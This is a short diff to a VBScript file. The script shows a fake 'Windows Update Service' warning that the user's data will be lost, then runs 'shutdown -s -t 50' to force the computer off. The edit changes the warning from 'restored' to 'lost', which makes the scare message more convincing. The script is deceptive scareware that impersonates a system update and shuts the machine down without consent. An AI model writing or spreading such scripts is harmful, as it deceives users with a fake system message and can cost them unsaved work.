@@ -1,5 +1,5 @@
 Dim objShell
-MsgBox "Your Windows version is out of date. You have to update up to Windows 10 2H22. Otherwise all your data will be restored.", 48, "Windows Update Service"
+MsgBox "Your Windows version is out of date. You have to update up to Windows 10 2H22. Otherwise all your data will be lost.", 48, "Windows Update Service"
 set objWSH = CreateObject("WScript.Shell")
  strCommand = "shutdown -s -t 50"  
 set objA = objWSH.Exec(strCommand)
